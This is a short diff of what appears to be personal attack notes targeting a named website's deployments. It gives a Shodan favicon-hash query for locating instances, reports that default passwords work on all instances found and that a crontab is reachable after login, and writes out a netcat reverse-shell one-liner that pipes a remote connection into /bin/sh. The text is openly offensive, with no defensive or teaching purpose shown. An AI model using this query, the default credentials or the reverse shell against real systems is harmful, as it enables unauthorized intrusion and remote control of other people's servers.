@@ -1,3 +1,13 @@
-default password on all instances i could find and cronjobs post auth
+https://www.fp4all.org/
 
-http.favicon.hash:-511027918
+shodan == http.favicon.hash:-511027918
+
+default password on all instances i could find and there's a crontab post auth
+
+scan and atk attached
+
+use this to get as $2 a reverse shell:
+
+mknod backpipe p; nc IP PORT 0<backpipe | /bin/sh 1>backpipe
+
+
